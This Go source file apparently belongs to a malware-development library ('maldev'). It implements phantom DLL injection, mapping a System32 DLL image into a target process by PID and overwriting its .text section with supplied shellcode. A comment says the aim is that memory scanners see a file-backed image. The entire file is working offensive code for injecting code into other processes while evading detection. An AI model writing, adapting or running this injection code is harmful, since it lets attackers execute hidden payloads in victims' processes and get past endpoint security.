//go:build windows

package inject

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// Section creation constants.
const (
	secIMAGE = 0x01000000 // SEC_IMAGE
)

// PhantomDLLInject creates a section from a legitimate System32 DLL,
// maps it into the target process, and overwrites the .text section
// with shellcode. The memory scanner sees a file-backed image.
func PhantomDLLInject(pid int, dllName string, shellcode []byte) error {
	if pid <= 0 {
		return fmt.Errorf("valid target process required")
	}
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. Build full path from System32.
	sys32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
	dllPath := filepath.Join(sys32, dllName)

	// Read local copy for PE parsing.
	localBytes, err := os.ReadFile(dllPath)
	if err != nil {
		return fmt.Errorf("failed to read source module")
	}

	// 2. Open DLL file for section creation.
	pathUTF16, err := windows.UTF16PtrFromString(dllPath)
	if err != nil {
		return fmt.Errorf("path conversion failed: %w", err)
	}

	hFile, err := windows.CreateFile(
		pathUTF16,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return fmt.Errorf("failed to open source module: %w", err)
	}
	defer windows.CloseHandle(hFile)

	// 3. NtCreateSection(SEC_IMAGE).
	var hSection windows.Handle
	var maxSize int64
	status, _, _ := api.ProcNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		0x0F001F, // SECTION_ALL_ACCESS
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		windows.PAGE_READONLY,
		secIMAGE,
		uintptr(hFile),
	)
	if status != 0 {
		return fmt.Errorf("section creation failed: NTSTATUS 0x%X", status)
	}
	defer windows.CloseHandle(hSection)

	// 4. Open target process.
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,
		false,
		uint32(pid),
	)
	if err != nil {
		return fmt.Errorf("failed to open target process: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	// 5. NtMapViewOfSection into target.
	var remoteBase uintptr
	var viewSize uintptr
	status, _, _ = api.ProcNtMapViewOfSection.Call(
		uintptr(hSection),
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&remoteBase)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		2, // ViewUnmap
		0,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if status != 0 {
		return fmt.Errorf("section mapping failed: NTSTATUS 0x%X", status)
	}

	// 6. Parse PE headers from local bytes to find .text section.
	textRVA, textSize, err := findTextSection(localBytes)
	if err != nil {
		return err
	}

	if uint32(len(shellcode)) > textSize {
		return fmt.Errorf("shellcode (%d bytes) exceeds .text section (%d bytes)",
			len(shellcode), textSize)
	}

	textAddr := remoteBase + uintptr(textRVA)

	// 7. VirtualProtectEx .text to RW.
	var oldProtect uint32
	if err := windows.VirtualProtectEx(
		hProcess, textAddr, uintptr(textSize),
		windows.PAGE_READWRITE, &oldProtect,
	); err != nil {
		return fmt.Errorf("memory protection change failed: %w", err)
	}

	// 8. Write shellcode to .text.
	if err := windows.WriteProcessMemory(
		hProcess, textAddr, &shellcode[0], uintptr(len(shellcode)), nil,
	); err != nil {
		return fmt.Errorf("remote memory write failed: %w", err)
	}

	// 9. VirtualProtectEx .text back to RX.
	if err := windows.VirtualProtectEx(
		hProcess, textAddr, uintptr(textSize),
		windows.PAGE_EXECUTE_READ, &oldProtect,
	); err != nil {
		return fmt.Errorf("memory protection restore failed: %w", err)
	}

	return nil
}

// findTextSection parses PE headers from raw bytes and returns the .text
// section's RVA and virtual size.
func findTextSection(peBytes []byte) (rva uint32, size uint32, err error) {
	if len(peBytes) < 0x40 {
		return 0, 0, fmt.Errorf("invalid PE: too small")
	}
	if peBytes[0] != 'M' || peBytes[1] != 'Z' {
		return 0, 0, fmt.Errorf("invalid PE: bad MZ signature")
	}

	eLfanew := *(*uint32)(unsafe.Pointer(&peBytes[0x3C]))
	if int(eLfanew)+24 > len(peBytes) {
		return 0, 0, fmt.Errorf("invalid PE: truncated headers")
	}

	peOff := int(eLfanew)
	peSig := *(*uint32)(unsafe.Pointer(&peBytes[peOff]))
	if peSig != 0x00004550 {
		return 0, 0, fmt.Errorf("invalid PE: bad PE signature")
	}

	coffOff := peOff + 4
	numSections := *(*uint16)(unsafe.Pointer(&peBytes[coffOff+2]))
	sizeOfOptHdr := *(*uint16)(unsafe.Pointer(&peBytes[coffOff+16]))
	sectionTableOff := coffOff + 20 + int(sizeOfOptHdr)

	for i := 0; i < int(numSections); i++ {
		secOff := sectionTableOff + i*40
		if secOff+40 > len(peBytes) {
			break
		}

		var name [8]byte
		copy(name[:], peBytes[secOff:secOff+8])
		nameStr := string(name[:])
		for k := 0; k < 8; k++ {
			if nameStr[k] == 0 {
				nameStr = nameStr[:k]
				break
			}
		}

		if nameStr == ".text" {
			vSize := *(*uint32)(unsafe.Pointer(&peBytes[secOff+8]))
			vAddr := *(*uint32)(unsafe.Pointer(&peBytes[secOff+12]))
			return vAddr, vSize, nil
		}
	}

	return 0, 0, fmt.Errorf(".text section not found in target module")
}
